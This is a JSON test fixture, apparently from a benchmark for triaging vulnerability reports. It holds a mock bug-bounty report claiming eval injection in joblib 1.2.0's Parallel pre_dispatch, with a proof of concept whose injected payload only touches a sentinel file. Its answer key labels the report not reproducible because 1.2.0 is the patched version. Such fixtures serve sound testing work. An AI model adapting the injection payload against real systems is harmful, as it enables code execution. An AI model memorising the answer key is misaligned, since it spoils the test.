@@ -1,0 +1,18 @@
+{
+  "report": {
+    "report_id": "joblib-vshift",
+    "package": "joblib",
+    "affected_version": "1.2.0",
+    "title": "RCE in joblib 1.2.0",
+    "body": "URGENT: joblib 1.2.0 is vulnerable to remote code execution. Please assign a CVE.\n\nEval code injection: parallel(pre_dispatch=...) passes the value to eval() unsanitized.\n\nAffected: 1.2.0.\n\nProof of concept:\n\n```python\nimport os, tempfile\nfrom joblib import Parallel, delayed\nsentinel = os.path.join(tempfile.gettempdir(), \"slopgate_joblib\")\ntry: os.remove(sentinel)\nexcept OSError: pass\ndef f(): return 1\npl = \"__import__('pathlib').Path(r'%s').touch()\" % sentinel\ntry: Parallel(n_jobs=2, pre_dispatch=pl)(delayed(f)() for _ in range(3))\nexcept Exception as e: print(\"raised:\", type(e).__name__)\nprint(\"SLOPGATE:REPRODUCED\" if os.path.exists(sentinel) else \"SLOPGATE:NOT_REPRODUCED\")\n```\n",
+    "reporter": "bounty_hunter"
+  },
+  "ground_truth": {
+    "expected_verdict": "not_reproducible",
+    "package": "joblib",
+    "fixed_version": "1.2.0",
+    "cve": "CVE-2022-21797",
+    "source": "GHSA/NVD",
+    "note": "real PoC but claims patched version"
+  }
+}
